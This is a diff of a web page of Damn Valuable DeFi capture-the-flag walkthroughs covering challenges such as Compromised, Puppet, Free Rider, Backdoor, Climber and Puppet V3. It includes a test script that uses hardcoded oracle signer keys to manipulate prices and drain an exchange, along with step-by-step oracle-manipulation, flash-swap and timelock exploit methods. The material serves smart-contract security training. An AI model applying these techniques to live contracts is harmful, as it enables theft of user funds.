+        [deployer, player] = await ethers.getSigners();
+            
+        // Initialize balance of the trusted source addresses
+        for (let i = 0; i &lt; sources.length; i++) {
+            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
+            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
+        }
+            
+        // Player starts with limited balance
+        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
+        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
+            
+        // Deploy the oracle and setup the trusted sources with initial prices
+        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
+        oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
+            await (await TrustfulOracleInitializerFactory.deploy(
+                sources,
+                ['DVNFT', 'DVNFT', 'DVNFT'],
+                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
+            )).oracle()
+        );
 
-    // Set price 1 wei, buy 1 NFT
-    await oracle.connect(signer1).postPrice("DVNFT", 1);
-    await oracle.connect(signer2).postPrice("DVNFT", 1);
-    await exchange.connect(player).buyOne({ value: 1 });
-
-    // Set price 999 ETH + 1 wei, sell 1 NFT
-    await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE + BigInt(1));
-    await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE + BigInt(1));
-    await nftToken.connect(player).approve(exchange.address, 0);
-    await exchange.connect(player).sellOne(0);
-
-    // Restore original price
-    await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE);
-    await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        // Deploy the exchange and get an instance to the associated ERC721 token
+        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
+            oracle.address,
+            { value: EXCHANGE_INITIAL_ETH_BALANCE }
+        );
+        nftToken = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
+        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
+        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
+    });
+    
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const PKEY1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const PKEY2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        const signer1 = new ethers.Wallet(PKEY1, ethers.provider);
+        const signer2 = new ethers.Wallet(PKEY2, ethers.provider);
+    
+        // Set Price - 1 WEI, and buy 1 NFT
+        await oracle.connect(signer1).postPrice("DVNFT", 1);
+        await oracle.connect(signer2).postPrice("DVNFT", 1);
+        await exchange.connect(player).buyOne({value: 1});
+    
+        // Set Price - 999 ETH + 1 WEI, and sell 1 NFT
+        await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE + BigInt(1));
+        await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE + BigInt(1));
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
+    
+        // Set Original Price
+        await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE);
+    });
+    
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+            
+        // Exchange must have lost all ETH
+        expect(await ethers.provider.getBalance(exchange.address)).to.be.eq(0);
+            
+        // Player's ETH balance must have significantly increased
+        expect(await ethers.provider.getBalance(player.address)).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
+            
+        // Player must not own any NFT
+        expect(await nftToken.balanceOf(player.address)).to.be.eq(0);
+    
+        // NFT price shouldn't have changed
+        expect(await oracle.getMedianPrice('DVNFT')).to.eq(INITIAL_NFT_PRICE);
+    });
 });</code></pre>
                     </div>
 
@@ -672,6 +1105,7 @@ contract AttackSelfiePool {
                     <div class="repo"><span>$ yarn run compromised</span></div>
                 </section>
 
+                <hr class="breakLine">
                 <!-- ============ 8 — PUPPET ============ -->
                 <section id="c8" class="challenge">
                     <h4><span class="num">08</span> Puppet</h4>
@@ -682,18 +1116,68 @@ contract AttackSelfiePool {
 
                     <h5>Goal</h5>
                     <ul>
-                        <li>A lending pool needs collateral worth twice the borrow amount in ETH; it holds 100,000 DVT.
-                            A Uniswap v1 DVT market has 10 ETH and 10 DVT.</li>
-                        <li>Take all tokens from the pool. You start with 25 ETH and 1000 DVT.</li>
+                        <li>There's a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they
+                            first need to
+                            deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in
+                            liquidity.</li>
+                        <li>There's a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT
+                            in liquidity.
+                        </li>
+                        <li>Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and
+                            1000 DVTs in
+                            balance.</li>
                     </ul>
 
                     <h5>Solution</h5>
                     <ul>
-                        <li><b>_computeOraclePrice()</b> reads price from the tiny Uniswap v1 pool as
-                            <code>uniswapOracle.balance / token.balanceOf(uniswapOracle)</code> — easily manipulated.
+                        <li>There is a lending contract requiring your collateral to be worth <b>twice</b> as much as
+                            your loan to
+                            borrow.</li>
+                        <li><b>borrow()</b> function allow the user to borrow borrowAmount amount of token only if the
+                            user pay at least
+                            an amount of ETH equal to the double of the token price. If the user has paid more than
+                            requested, the
+                            difference is sent back to the user.</li>
+                        <li><b>calculateDepositRequired(uint256 amount)</b> that will calculate the amount of ETH you
+                            need to deposit
+                            given the amount of tokens you would like to borrow. Math seems to be fine, the order of
+                            operations to not
+                            incur in meth <b>rounding error</b> is respected.</li>
+                        <li><b>_computeOraclePrice()</b> function that will calculate the price of the token in the
+                            <b>Uniswap V1
+                                exchange DVT-ETH Pool</b>. This price is used by <b>calculateDepositRequired()</b> to
+                            calculate the
+                            amount of ether needed to be deposited to borrow the tokens.
                         </li>
-                        <li>Dump all DVT into Uniswap to crash the DVT price, then borrow all 100,000 DVT for a tiny ETH
-                            collateral.</li>
+                        <li>However, there is no flash loan in this challenge, instead, another bug in the
+                            <b>computeOraclePrice()</b> function makes this easily exploitable - it uses <b>integer
+                                division</b> to
+                            compute the price as:
+                            <div class="container" id="code">
+                                <pre><code>function computeOraclePrice() public view returns (uint256) {
+    // this is wrong and will be 0 due to integer division as soon as the pool's token balance > ETH balance
+    return uniswapOracle.balance.div(token.balanceOf(uniswapOracle));
+}</code></pre>
+                            </div>
+                        </li>
+                        <li>Approve the Uniswap exchange to receive the DVT tokens for exchange.</li>
+                        <li>Sell all the tokens that we own for some ETH. Currently we know that <b>1 ETH = 1 DVT</b>.
+                            tokenToEthSwapInput(amountIn, minAmountOut, deadline, receiver) will perform a swap saying:
+                            sell all the
+                            token and at least I want 1 ETH back (the minimum amount of tokenOut we expect). Make the
+                            transaction fail
+                            if it does not succeed before the specified deadline. After the swap, the price of the DVT
+                            token calculated
+                            by the Oracle inside the Puppet pool will drop. This will mean that for just a little ETH
+                            (the collateral)
+                            we will be able to borrow all the DVTs that are inside the pool.</li>
+                        <li>We calculate how much ETH as collateral we need to be able to borrow one DVT token.</li>
+                        <li>We calculate how much token we can borrow from the pool given the amount of ETH that we have
+                            in our
+                            balance.</li>
+                        <li>And we call <b>lendingPool.borrow()</b> to borrow all the available DVTs by <b>manipulating
+                                the
+                                oracle</b> with low price of DVTs.</li>
                     </ul>
 
                     <span class="levelBox">AttackPuppet.sol</span>
@@ -764,6 +1248,8 @@ contract AttackPuppet {
                     <div class="repo"><span>$ yarn run puppet</span></div>
                 </section>
 
+                <hr class="breakLine">
+
                 <!-- ============ 9 — PUPPET V2 ============ -->
                 <section id="c9" class="challenge">
                     <h4><span class="num">09</span> Puppet V2</h4>
@@ -774,17 +1260,75 @@ contract AttackPuppet {
 
                     <h5>Goal</h5>
                     <ul>
-                        <li>Now using a Uniswap v2 exchange as oracle. You start with 20 ETH and 10,000 DVT; the pool
-                            has a million DVT.</li>
+                        <li>Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended
+                            utility libraries.
+                            That should be enough.</li>
+                        <li>You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in
+                            balance. You
+                            know what to do.</li>
                     </ul>
 
                     <h5>Solution</h5>
                     <ul>
-                        <li>Same idea as Puppet, but the price comes from Uniswap v2 reserves via
-                            <b>_getOracleQuote()</b> and a deposit factor of 3.
+                        <li>It is similar to the Puppet contract but in puppet-v2 it uses <b>Uniswap-V2 exchange</b> to
+                            compute the
+                            oracle price.</li>
+                        <li>The smart contract PuppetV2Pool allows borrowing tokens against WETH collateral, using the
+                            <b>Uniswap V2
+                                exchange</b> for price information. Users can <b>deposit WETH</b> and <b>borrow the
+                                DVT</b> token by
+                            collateral requirements and calculations defined in the contract.
                         </li>
-                        <li>Dump 10,000 DVT into the pair (≈ 9 ETH back) to crash the price, wrap ETH to WETH, then
-                            borrow all 1,000,000 DVT for cheap.</li>
+                        <li><b>borrow()</b> function of this contract is to allow users to borrow the DVT token by first
+                            depositing
+                            three times the value of the borrowed tokens in WETH.</li>
+                        <li><b>calculateDepositOfWETHRequired(uint256 tokenAmount)</b> used to calculate the amount of
+                            WETH required to
+                            borrow a given amount of the specified token. This calculation takes into account a deposit
+                            factor of
+                            <b>3</b> and fetches the price ratio between WETH and the specified token from the Uniswap
+                            V2 pair
+                            liquidity.
+                        </li>
+                        <li>The contract uses the Uniswap V2 library to obtain price quotes from the Uniswap V2
+                            exchange, allowing it
+                            to determine the price ratio between <b>WETH and the DVT</b> tokens.</li>
+                        <li>The vulnerability in the Puppet V2 challenge lies in the way the contract fetches the price
+                            of the DVT
+                            token. It relies on a function called <b>_getOracleQuote(uint256 amount)</b>, which
+                            calculates the price of
+                            the token using the current liquidity pair contract <b>reserves</b>:
+                            <div class="container" id="code">
+                                <pre><code>// Fetch the price from Uniswap v2 using the official libraries
+function _getOracleQuote(uint256 amount) private view returns (uint256) {
+  (uint256 reservesWETH, uint256 reservesToken) =
+      UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
+  return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
+}</code></pre>
+                            </div>
+                        </li>
+                        <li>The reserves can't be manipulated through flashSwap, but they can be manipulated through
+                            external capital
+                            that can be either owned by the attacker or utilized using a <b>FlashLoan from another
+                                protocol</b>.</li>
+                        <li>Exploiting the PuppetV2Pool:
+                            <ul>
+                                <li>The liquidity pool starts with 100 DVT tokens and 10 WETH.</li>
+                                <li>We will dump all our <b>10,000 DVT</b> tokens to the liquidity pool, we will receive
+                                    around
+                                    <b>9 ETH.</b>
+                                </li>
+                                <li>By dumping our tokens we significantly reduce the DVT price in the uniswap-v2 pool.
+                                </li>
+                                <li>We will deposit our ETH that we got from the sale that that we had in the beginning
+                                    into the
+                                    PuppetV2 pool as our collateral.</li>
+                                <li>Now since the DVT price is very low — with around <b>20 ETH</b> we can borrow all
+                                    the
+                                    <b>100,000 DVT</b> tokens from the pool using <b>borrow()</b> function.
+                                </li>
+                            </ul>
+                        </li>
                     </ul>
 
                     <span class="levelBox">AttackPuppetV2.sol</span>
@@ -865,6 +1409,8 @@ contract AttackPuppetV2 {
                     <div class="repo"><span>$ yarn run puppet-v2</span></div>
                 </section>
 
+                <hr class="breakLine">
+
                 <!-- ============ 10 — FREE RIDER ============ -->
                 <section id="c10" class="challenge">
                     <h4><span class="num">10</span> Free Rider</h4>
@@ -878,18 +1424,37 @@ contract AttackPuppetV2 {
 
                     <h5>Goal</h5>
                     <ul>
-                        <li>A marketplace minted 6 NFTs at 15 ETH each. It's vulnerable — all tokens can be taken. A 45
-                            ETH bounty awaits whoever recovers them. You have 0.1 ETH.</li>
+                        <li>A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6
+                            NFTs, which are
+                            available for sale in the marketplace. Each one at 15 ETH.</li>
+                        <li>The developers behind it have been notified the marketplace is vulnerable. All tokens can be
+                            taken. Yet they
+                            have absolutely no idea how to do it. So they're offering a bounty of 45 ETH for whoever is
+                            willing to take
+                            the NFTs out and send them their way.</li>
+                        <li>You've agreed to help. Although, you only have 0.1 ETH in balance. The devs just won't reply
+                            to your
+                            messages asking for more. If only you could get free ETH, at least for an instant.</li>
                     </ul>
 
                     <h5>Solution</h5>
                     <ul>
-                        <li>Flash-swap 15 WETH from a Uniswap v2 pair (triggers <b>uniswapV2Call()</b>), unwrap to ETH.
+                        <li>At first we <b>flash swap</b> with <b>15 WETH</b> from <b>uniswap-v2</b> pair contract using
+                            <b>pair.swap(amount want, min amount, WETH receiver, calldata);</b>
                         </li>
-                        <li>The marketplace bug charges only 15 ETH for <i>all</i> NFTs via <b>buyMany()</b>. Buy all 6,
-                            repay the flash swap with the 0.3% fee, then send the NFTs to the recovery contract for the
-                            45 ETH bounty.</li>
-                        <li>Note: <b>safeTransferFrom</b> triggers <code>onERC721Received</code>, which must return the
+                        <li>NOTE: while doing a swap in uniswap-v2 we trigger the <b>uniswapV2Call()</b> callback
+                            function.</li>
+                        <li>After getting WETH we convert the WETH to native eth using <b>weth.withdraw(amount);</b>
+                        </li>
+                        <li>Buy the NFTs from FreeRiderMarketplace, where there is a bug that it takes only 15 eth for
+                            all NFTs.</li>
+                        <li>We have 0.5 native eth, with that we convert native eth to WETH with fees.</li>
+                        <li>After that we repay the WETH in that flash swap with fee of 0.3%.</li>
+                        <li>After buying all 6 NFTs with only 15 eth, we sent all the tokens to <b>FreeRiderRecovery</b>
+                            and get the
+                            Bounty of 45 eth.</li>
+                        <li>NOTE: After receiving a NFT the onERC721Received fallback is called, here we have to return
+                            the fallback
                             selector.</li>
                     </ul>
 
@@ -970,6 +1535,9 @@ contract AttackFreeRider {
                     <h5>Run</h5>
                     <div class="repo"><span>$ yarn run free-rider</span></div>
                 </section>
+
+                <hr class="breakLine">
+
                 <!-- ============ 11 — BACKDOOR ============ -->
                 <section id="c11" class="challenge">
                     <h4><span class="num">11</span> Backdoor</h4>
@@ -980,21 +1548,53 @@ contract AttackFreeRider {
 
                     <h5>Goal</h5>
                     <ul>
-                        <li>A registry of Gnosis Safe wallets pays 10 DVT per registered wallet. Four beneficiaries
-                            (Alice, Bob, Charlie, David); registry holds 40 DVT.</li>
-                        <li>Take all funds from the registry in a single transaction.</li>
+                        <li>To incentivize the creation of more secure wallets in their team, someone has deployed a
+                            registry of Gnosis
+                            Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT
+                            tokens.</li>
+                        <li>To make sure everything is safe and sound, the registry tightly integrates with the
+                            legitimate Gnosis Safe
+                            Proxy Factory, and has some additional safety checks.</li>
+                        <li>Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David.
+                            The registry has
+                            40 DVT tokens in balance to be distributed among them.</li>
+                        <li>Your goal is to take all funds from the registry. In a single transaction.</li>
                     </ul>
 
                     <h5>Solution</h5>
                     <ul>
-                        <li>Understand the Gnosis Safe <a href="https://docs.safe.global/home/what-is-safe"
-                                target="_blank">proxy creation</a> flow. Deploy a malicious module, then call
-                            <b>createProxyWithCallback()</b> for each user.
+                        <li>In this challenge, we have single smart contract, <b>WalletRegistry.sol</b> which functions
+                            as a registry
+                            for <b>Gnosis Safe wallets</b>. Its primary objective is to register their Gnosis Safe
+                            wallets and rewarding
+                            them with <b>10 Damn Valuable Tokens (DVT)</b> for each registered wallet.</li>
+                        <li>It is essential to understand the <a href="https://docs.safe.global/home/what-is-safe"
+                                target="_blank">Gnosis Safe</a> proxy creation process.</li>
+                        <li><i>Deploy Malicious Contract</i>: Initially, we create a new malicious contract.
+                            Subsequently, we trigger
+                            the <b>Gnosis Safe Factory</b> contract, executing the <b>createProxyWithCallback()</b>
+                            function.</li>
+                        <li><i>Create Gnosis Safe Proxy</i>: The factory, in response, deploys a Gnosis Safe Proxy,
+                            pointing to the
+                            <b>masterCopy implementation</b>.
                         </li>
-                        <li>The setup runs the module, which approves our attacker to spend the new Safe's DVT. The
-                            callback hits <b>WalletRegistry</b>, validations pass, 10 DVT lands in the Safe.</li>
-                        <li>Using the granted allowance, <b>transferFrom()</b> drains each Safe — all in one
-                            transaction.</li>
+                        <li><i>Execute Malicious Module</i>: The setup function is automatically executed within the new
+                            proxy, allowing
+                            our malicious module within the <b>MaliciousApprove</b> contract to grant approval for our
+                            attacker
+                            contract to manage DVT tokens on behalf of the new Safe Proxy.</li>
+                        <li><i>Callback Execution</i>: The callback function is activated, calling the
+                            <b>WalletRegistry</b>, which
+                            performs a series of validations and checks.
+                        </li>
+                        <li><i>DVT Token Transfer</i>: Since all the checks passed, the WalletRegistry facilitates the
+                            <b>transfer</b>
+                            of DVT tokens to the Safe Proxy.
+                        </li>
+                        <li><i>Token Theft</i>: Leveraging the previously obtained allowance, we execute the
+                            <b>transferFrom()</b>
+                            function to steal the DVT tokens from the Safe.
+                        </li>
                     </ul>
 
                     <span class="levelBox">AttackBackdoor.sol</span>
@@ -1060,6 +1660,8 @@ contract AttackBackdoor {
                     <div class="repo"><span>$ yarn run backdoor</span></div>
                 </section>
 
+                <hr class="breakLine">
+
                 <!-- ============ 12 — CLIMBER ============ -->
                 <section id="c12" class="challenge">
                     <h4><span class="num">12</span> Climber</h4>
@@ -1073,20 +1675,73 @@ contract AttackBackdoor {
 
                     <h5>Goal</h5>
                     <ul>
-                        <li>A UUPS-upgradeable vault guards 10 million DVT. Owner is a timelock that withdraws limited
-                            amounts every 15 days; an emergency role can sweep all tokens. Only a "Proposer" can
-                            schedule actions (executed 1 hour later).</li>
-                        <li>Take all tokens from the vault.</li>
+                        <li>There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable,
+                            following the UUPS
+                            pattern.</li>
+                        <li>The owner of the vault, currently a timelock contract, can withdraw a very limited amount of
+                            tokens every 15
+                            days. On the vault there's an additional role with powers to sweep all tokens in case of an
+                            emergency.</li>
+                        <li>On the timelock, only an account with a "Proposer" role can schedule actions that can be
+                            executed 1 hour
+                            later.</li>
+                        <li>To pass this challenge, take all tokens from the vault.</li>
                     </ul>
 
                     <h5>Solution</h5>
                     <ul>
-                        <li>The bug is in the timelock's <b>execute()</b>: anyone can call it, and it executes the
-                            operations <i>before</i> checking they were scheduled.</li>
-                        <li>So we schedule our own actions during the same call: grant the timelock the PROPOSER role,
-                            set the delay to 0, upgrade the vault to a malicious implementation that lets anyone set the
-                            sweeper, then sweep.</li>
-                        <li>Finally <b>withdraw()</b> from the attacker contract.</li>
+                        <li>Exploring the contracts:
+                            <ul>
+                                <li><b>ClimberConstants.sol</b>: All the storage constant values are stored in this
+                                    contract.</li>
+                                <li><b>ClimberErrors.sol</b>: All the user defined Errors are stored in this contract.
+                                </li>
+                                <li><b>ClimberTimelock.sol</b>: This contract mimics the OpenZeppelin Timelock
+                                    controller
+                                    implementation. Allow the execution of a bulk of operations only if those operations
+                                    have been
+                                    previously scheduled and a specific delay has passed. Operations are executed via a
+                                    low-level call.
+                                </li>
+                                <li><b>ClimberTimelockBase.sol</b>: It is an abstract contract for ClimberTimelock
+                                    contract.</li>
+                                <li><b>ClimberVault.sol</b>: The ClimberVault is the vault contract where all the DVT
+                                    token are stored.
+                                    It is an upgradable contract accessed via a Proxy Contract. The contract inherit
+                                    from the
+                                    OpenZeppelin UUPSUpgradeable contract implementation.</li>
+                            </ul>
+                        </li>
+                        <li>Essentially the bug here is in the <b>Timelock</b> Contract during the <b>execute()</b>
+                            function.</li>
+                        <li>Firstly, it allows <b>anyone to call</b> it which gives us an entry point. Secondly it
+                            executes the given
+                            commands, BEFORE checking that it is ready for execution.</li>
+                        <li>This means that we are able to schedule the command we are performing at the same time as
+                            doing it so that
+                            once we complete our actions, the operation we just performed was a valid operation ready
+                            for execution.</li>
+                        <li>So we have to follow these commands to schedule our own actions in order:
+                            <ol>
+                                <li>Set the Timelock Contract to have the <b>PROPOSER</b> role.</li>
+                                <li><b>Update delay</b> of schedule execution to <b>0</b> to allow immediate execution.
+                                </li>
+                                <li>Call to Vault contract to upgrade to <b>malicious attacker</b> controlled contract
+                                    which allows
+                                    setting the <b>sweeper</b> to anyone.</li>
+                                <li>Call to another attacker controlled contract to handle the scheduling and sweeping.
+                                </li>
+                            </ol>
+                        </li>
+                        <li>Once we generate the <b>to</b> and <b>data</b> values for the 4 calls above, we will need to
+                            pass that to
+                            our attacking contract to store so we don't run into recursive issues.</li>
+                        <li>This comes from the timelock contract being unable to schedule calls itself, nor being able
+                            to pass the
+                            execution data to the contract at runtime as it will also run into recursion issues.</li>
+                        <li>Then once the attacker controlled contract sweeps the funds, we run a <b>withdraw()</b> on
+                            the contract to
+                            take the funds.</li>
                     </ul>
 
                     <span class="levelBox">AttackTimelock.sol</span>
@@ -1159,6 +1814,8 @@ contract AttackTimelock {
                     <div class="repo"><span>$ yarn run climber</span></div>
                 </section>
 
+                <hr class="breakLine">
+
                 <!-- ============ 13 — WALLET MINING ============ -->
                 <section id="c13" class="challenge">
                     <h4><span class="num">13</span> Wallet Mining</h4>
@@ -1172,35 +1829,150 @@ contract AttackTimelock {
 
                     <h5>Goal</h5>
                     <ul>
-                        <li>A contract pays 1 DVT to deploy Gnosis Safe wallets through an upgradeable authorization
-                            mechanism. Someone sent 20 million DVT to an empty deposit address that's been assigned as a
-                            ward.</li>
-                        <li>Obtain all tokens held by the deployer, plus the 20 million DVT.</li>
+                        <li>There's a contract that incentivizes users to deploy Gnosis Safe wallets, rewarding them
+                            with 1 DVT. It
+                            integrates with an upgradeable authorization mechanism. This way it ensures only allowed
+                            deployers (a.k.a.
+                            wards) are paid for specific deployments. Mind you, some parts of the system have been
+                            highly optimized by
+                            anon CT gurus.</li>
+                        <li>The deployer contract only works with the official Gnosis Safe factory at
+                            0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B and corresponding master copy at
+                            0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F. Not sure how it's supposed to work though -
+                            those contracts
+                            haven't been deployed to this chain yet.</li>
+                        <li>In the meantime, it seems somebody transferred 20 million DVT tokens to
+                            0x9b6fb606a9f5789444c17768c6dfcf2f83563801. Which has been assigned to a ward in the
+                            authorization
+                            contract. Strange, because this address is empty as well.</li>
+                        <li>Pass the challenge by obtaining all tokens held by the wallet deployer contract. Oh, and the
+                            20 million DVT
+                            tokens too.</li>
                     </ul>
 
                     <h5>Solution</h5>
                     <ul>
                         <li>The deposit address is a counterfactual Gnosis Safe — by replaying the exact
-                            factory/master-copy deployment nonce sequence you can deploy the Safe to that precise
-                            address, become its owner, and move the 20M DVT.</li>
+                            factory/master-copy deployment
+                            nonce sequence you can deploy the Safe to that precise address, become its owner, and move
+                            the 20M DVT.</li>
                         <li>The authorizer's storage can be initialized by the player (uninitialized proxy), authorizing
-                            the player to collect deployer rewards by deploying wallets.</li>
+                            the player to
+                            collect deployer rewards by deploying wallets.</li>
                     </ul>
 
-                    <span class="levelBox">wallet-mining.challenge.js (scaffold)</span>
+                    <span class="levelBox">wallet-mining.challenge.js</span>
                     <div class="container" id="code">
-                        <pre><code>it('Execution', async function () {
-    /** CODE YOUR SOLUTION HERE */
-    // 1) take over the uninitialized AuthorizerUpgradeable proxy
-    // 2) deploy the Gnosis factory + master copy via the recorded nonces
-    // 3) counterfactually deploy the Safe at DEPOSIT_ADDRESS, claim 20M DVT
-    // 4) mine deployer rewards to drain WalletDeployer
-});</code></pre>
+                        <pre><code>const { ethers, upgrades } = require('hardhat');
+const { expect } = require('chai');
+
+describe('[Challenge] Wallet mining', function () {
+    let deployer, player;
+    let token, authorizer, walletDeployer;
+    let initialWalletDeployerTokenBalance;
+    
+    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
+    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [ deployer, ward, player ] = await ethers.getSigners();
+
+        // Deploy Damn Valuable Token contract
+        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+
+        // Deploy authorizer with the corresponding proxy
+        authorizer = await upgrades.deployProxy(
+            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
+            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
+            { kind: 'uups', initializer: 'init' }
+        );
+        
+        expect(await authorizer.owner()).to.eq(deployer.address);
+        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
+        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;
+
+        // Deploy Safe Deployer contract
+        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
+            token.address
+        );
+        expect(await walletDeployer.chief()).to.eq(deployer.address);
+        expect(await walletDeployer.gem()).to.eq(token.address);
+        
+        // Set Authorizer in Safe Deployer
+        await walletDeployer.rule(authorizer.address);
+        expect(await walletDeployer.mom()).to.eq(authorizer.address);
+
+        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
+        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;
+
+        // Fund Safe Deployer with tokens
+        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
+        await token.transfer(
+            walletDeployer.address,
+            initialWalletDeployerTokenBalance
+        );
+
+        // Ensure these accounts start empty
+        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
+        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
+        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');
+
+        // Deposit large amount of DVT tokens to the deposit address
+        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);
+
+        // Ensure initial balances are set correctly
+        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
+        expect(await token.balanceOf(walletDeployer.address)).eq(
+            initialWalletDeployerTokenBalance
+        );
+        expect(await token.balanceOf(player.address)).eq(0);
+    });
+
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS */
+
+        // Factory account must have code
+        expect(
+            await ethers.provider.getCode(await walletDeployer.fact())
+        ).to.not.eq('0x');
+
+        // Master copy account must have code
+        expect(
+            await ethers.provider.getCode(await walletDeployer.copy())
+        ).to.not.eq('0x');
+
+        // Deposit account must have code
+        expect(
+            await ethers.provider.getCode(DEPOSIT_ADDRESS)
+        ).to.not.eq('0x');
+        
+        // The deposit address and the Safe Deployer contract must not hold tokens
+        expect(
+            await token.balanceOf(DEPOSIT_ADDRESS)
+        ).to.eq(0);
+        expect(
+            await token.balanceOf(walletDeployer.address)
+        ).to.eq(0);
+
+        // Player must own all tokens
+        expect(
+            await token.balanceOf(player.address)
+        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
+    });
+});
+</code></pre>
                     </div>
 
                     <h5>Run</h5>
                     <div class="repo"><span>$ yarn run wallet-mining</span></div>
                 </section>
+
+                <hr class="breakLine">
 
                 <!-- ============ 14 — PUPPET V3 ============ -->
                 <section id="c14" class="challenge">
@@ -1212,20 +1984,57 @@ contract AttackTimelock {
 
                     <h5>Goal</h5>
                     <ul>
-                        <li>Now using Uniswap V3 as a TWAP oracle. The market has 100 WETH and 100 DVT; the lending pool
-                            a million DVT.</li>
-                        <li>Starting with 1 ETH and some DVT, take all tokens from the lending pool. Requires a
-                            mainnet-fork RPC.</li>
+                        <li>In the latest version, they're using Uniswap V3 as an oracle. That's right, no longer using
+                            spot prices!
+                            This time the pool queries the time-weighted average price of the asset, with all the
+                            recommended libraries.
+                        </li>
+                        <li>The Uniswap market has 100 WETH and 100 DVT in liquidity. The lending pool has a million DVT
+                            tokens.</li>
+                        <li>Starting with 1 ETH and some DVT, pass this challenge by taking all tokens from the lending
+                            pool.</li>
+                        <li>NOTE: unlike others, this challenge requires you to set a valid RPC URL in the challenge's
+                            test file to fork
+                            mainnet state into your local environment.</li>
                     </ul>
 
                     <h5>Solution</h5>
                     <ul>
-                        <li>A TWAP is a time-weighted moving average — price levels that persist longer get more weight.
+                        <li>Exploit is very similar to Puppet-V2 except this uses <b>Uniswap's V3 Time Weighted Average
+                                Price
+                                (TWAP)</b> to calculate the price. We also need to connect to Uniswap's Router to make
+                            our lives
+                            easier.</li>
+                        <li>A TWAP (Time Weighted Average Price) is like a simple moving <b>average</b> except that
+                            times where the
+                            price <b>stayed the same</b> longer get more weight — a TWAP weights price by how long the
+                            price stays at a
+                            certain level.
+                            <div><img src="./blog-images/twap.webp" alt="TWAP illustration" width="60%"></div>
                         </li>
-                        <div><img src="./blog-images/twap.webp" alt="TWAP illustration" width="60%"></div>
-                        <li>If the TWAP window is short it's still vulnerable. Swap all DVT for WETH to devalue DVT,
-                            then wait ~100 seconds for the TWAP to move (a fresh trade has time-weight 0), then borrow
-                            all DVT against the now-cheap collateral.</li>
+                        <li>This can be exploited if the TWAP period is short enough that it is still susceptible to
+                            short term
+                            volatility.</li>
+                        <li>We make a trade buying all WETH in the pool, heavily devaluing the DVT token relative to the
+                            WETH token.
+                        </li>
+                        <li>However if we were to get the price directly after the trade, the price would still be
+                            <b>1:1</b> since the
+                            new price has a <b>Time Weight of 0</b>.
+                        </li>
+                        <li>So we need to wait a few minutes for the TWAP to move to an appropriate price <b>(100
+                                seconds)</b> then
+                            call the lending pool which then uses the heavily devalued price.</li>
